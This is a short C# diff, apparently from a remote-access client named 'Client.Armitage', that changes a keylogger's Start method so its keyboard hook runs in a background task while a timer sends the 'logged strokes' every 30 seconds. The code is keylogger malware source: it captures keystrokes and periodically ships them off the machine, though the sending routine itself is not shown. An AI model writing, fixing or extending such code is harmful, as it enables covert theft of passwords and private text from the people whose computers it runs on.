@@ -120,17 +120,18 @@ namespace Client.Armitage.Watchers
         }
 
         private static System.Timers.Timer _refreshtimer;
-        public static void Start()
+        public async static void Start()
         {
             _refreshtimer = new System.Timers.Timer();
             // Every 30 seconds, automatically send the logged strokes.
             _refreshtimer.Interval = 30 * 1000;
             _refreshtimer.Elapsed += _refreshtimer_Elapsed;
             _refreshtimer.Start();
-
-            _hookID = SetHook(_proc);
-            Application.Run();
-            UnhookWindowsHookEx(_hookID);
+            await Task.Run(() => {
+                _hookID = SetHook(_proc);
+                Application.Run();
+                UnhookWindowsHookEx(_hookID);
+            });
         }
 
         private static void _refreshtimer_Elapsed(object sender, System.Timers.ElapsedEventArgs e)
